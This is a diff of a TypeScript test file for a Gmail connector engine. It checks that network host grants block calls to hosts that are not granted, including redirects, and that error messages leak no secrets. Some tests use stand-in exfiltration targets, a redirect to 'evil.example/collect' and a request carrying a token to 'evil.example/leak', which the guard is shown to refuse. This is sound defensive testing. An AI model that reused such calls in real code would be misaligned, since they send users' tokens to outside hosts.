@@ -18,8 +18,11 @@ import {
     conduitTools,
     connectorClientSecretNames,
     connectorToolName,
+    ConnectorNetworkError,
     ConnectorToolError,
+    connectorHostAllowed,
     createConnectorEngine,
+    guardHttp,
     gmailConnectorPlugin,
     operationAnnotations,
     type ConnectorEngine
@@ -266,6 +269,101 @@ describe('conduitTools — execute', () => {
         const before = h.google.seen.length;
         await expect(byName(again.tools, 'gmail__search-messages').run({}, ctx())).rejects.toMatchObject({ code: 'needs_reauth' });
         expect(h.google.seen.length).toBe(before);
+    });
+});
+
+describe('network: grants on the conduit fetch (#642)', () => {
+    /** The same workspace's engine over the same accounts, behind the plugin's granted `network:` hosts — as a session opens it. */
+    const guarded = (h: Harness, allowedHosts: readonly string[]) =>
+        createConnectorEngine({
+            secret: 'a-workspace-secret-that-is-long-enough-0123456789',
+            accounts: h.accounts,
+            transient: memoryTransient(),
+            locks: inProcessLocks(),
+            clients: clientFromSecrets(async (name) => ({ 'gmail-client-id': 'cid.apps.googleusercontent.com', 'gmail-client-secret': 'client-shh' })[name], 'gmail'),
+            redirectUri: REDIRECT,
+            http: h.google.http,
+            allowedHosts
+        });
+
+    it('with network:gmail.googleapis.com revoked, a Gmail tool call fails with a clear permission error and Google sees nothing', async () => {
+        const h = harness();
+        const account = await h.connect();
+        const engine = guarded(h, ['oauth2.googleapis.com']);
+        const connector = await conduitTools(engine, { id: 'gmail', connector: 'gmail', account, owner: OWNER });
+        const before = h.google.seen.length;
+        const failure = await byName(connector.tools, 'gmail__search-messages').run({ query: 'is:unread' }, ctx()).then(
+            () => undefined,
+            (e: unknown) => e
+        );
+        expect(failure).toBeInstanceOf(ConnectorToolError);
+        (globalThis as any).process?.stderr?.write?.('DBG ' + (failure as Error).message + '\n');
+        expect((failure as ConnectorToolError).code).toBe('network_not_granted');
+        expect((failure as ConnectorToolError).tool).toBe('gmail__search-messages');
+        expect((failure as Error).message).toBe("Permission denied: network:gmail.googleapis.com is not granted to this connector: the workspace owner can grant it on the connector's plugin page.");
+        // Scrubbed: no path, query, token or client secret.
+        expect((failure as Error).message).not.toMatch(/users\/me|is:unread|at-1|rt-1|client-shh/);
+        // Refused before it was sent, and not retried.
+        expect(h.google.seen.length).toBe(before);
+    });
+
+    it('with both Google hosts granted, the same call goes through', async () => {
+        const h = harness();
+        const account = await h.connect();
+        const connector = await conduitTools(guarded(h, ['gmail.googleapis.com', 'oauth2.googleapis.com']), { id: 'gmail', connector: 'gmail', account, owner: OWNER });
+        const out = await byName(connector.tools, 'gmail__search-messages').run({ query: 'is:unread' }, ctx());
+        expect(out).toBeDefined();
+        expect(h.google.seen.some((r) => r.url.startsWith(GMAIL))).toBe(true);
+    });
+
+    it('a granted host that redirects elsewhere reaches nothing there: conduit follows redirects itself, every hop checked and sent through the guarded http', async () => {
+        const h = harness();
+        const account = await h.connect();
+        const hops: string[] = [];
+        const redirecting = async (request: Request): Promise<Response> => {
+            hops.push(`${new URL(request.url).host} ${request.redirect}`);
+            if (request.url.startsWith(GMAIL)) return new Response(null, { status: 307, headers: { location: 'https://evil.example/collect' } });
+            return h.google.http(request);
+        };
+        const engine = createConnectorEngine({
+            secret: 'a-workspace-secret-that-is-long-enough-0123456789',
+            accounts: h.accounts,
+            transient: memoryTransient(),
+            locks: inProcessLocks(),
+            clients: clientFromSecrets(async (name) => ({ 'gmail-client-id': 'cid.apps.googleusercontent.com', 'gmail-client-secret': 'client-shh' })[name], 'gmail'),
+            redirectUri: REDIRECT,
+            http: redirecting,
+            allowedHosts: ['gmail.googleapis.com', 'oauth2.googleapis.com']
+        });
+        const connector = await conduitTools(engine, { id: 'gmail', connector: 'gmail', account, owner: OWNER });
+        const failure = await byName(connector.tools, 'gmail__search-messages').run({ query: 'is:unread' }, ctx()).then(
+            () => undefined,
+            (e: unknown) => e
+        );
+        expect(failure).toBeInstanceOf(ConnectorToolError);
+        expect((failure as Error).message).toContain('evil.example is not allowed');
+        // `redirect: 'manual'`: the engine's http sees each hop, and the second one never left.
+        expect(hops).toEqual(['gmail.googleapis.com manual']);
+    });
+
+    it('guardHttp matches a grant by host or hostname and names only the scope', async () => {
+        expect(connectorHostAllowed(['gmail.googleapis.com'], new URL('https://gmail.googleapis.com/x'))).toBe(true);
+        expect(connectorHostAllowed(['gmail.googleapis.com'], new URL('https://gmail.googleapis.com:8443/x'))).toBe(true);
+        expect(connectorHostAllowed(['gmail.googleapis.com'], new URL('https://evil.example/x'))).toBe(false);
+        let sent = 0;
+        const http = guardHttp(async () => {
+            sent++;
+            return new Response('ok');
+        }, ['gmail.googleapis.com']);
+        const failure = await http(new Request('https://evil.example/leak?token=abc123')).then(
+            () => undefined,
+            (e: unknown) => e
+        );
+        expect(failure).toBeInstanceOf(ConnectorNetworkError);
+        expect((failure as ConnectorNetworkError).scope).toBe('network:evil.example');
+        expect((failure as Error).message).not.toMatch(/leak|abc123/);
+        expect(sent).toBe(0);
+        expect(await (await http(new Request('https://gmail.googleapis.com/x'))).text()).toBe('ok');
     });
 });
 
